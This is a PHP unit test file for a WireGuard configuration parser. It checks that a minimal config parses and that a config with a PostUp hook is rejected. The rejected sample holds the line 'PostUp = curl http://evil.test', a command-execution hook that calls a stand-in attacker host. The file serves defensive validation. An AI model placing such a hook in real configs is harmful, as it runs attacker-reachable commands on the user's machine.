<?php

namespace Tests\Unit;

use App\Support\DwVpnWireguard;
use InvalidArgumentException;
use Tests\TestCase;

class DwVpnWireguardTest extends TestCase
{
    public function test_aceita_config_minima(): void
    {
        $parsed = DwVpnWireguard::analisar(<<<'WG'
[Interface]
PrivateKey = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
Address = 10.10.0.2/32

[Peer]
PublicKey = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
Endpoint = vpn.exemplo.com:51820
AllowedIPs = 10.0.0.0/8
WG);

        $this->assertSame('10.10.0.2/32', $parsed['address']);
        $this->assertSame('vpn.exemplo.com:51820', $parsed['endpoint']);
    }

    public function test_rejeita_postup(): void
    {
        $this->expectException(InvalidArgumentException::class);
        DwVpnWireguard::analisar(<<<'WG'
[Interface]
PrivateKey = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
Address = 10.10.0.2/32
PostUp = curl http://evil.test

[Peer]
PublicKey = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
Endpoint = vpn.exemplo.com:51820
WG);
    }
}
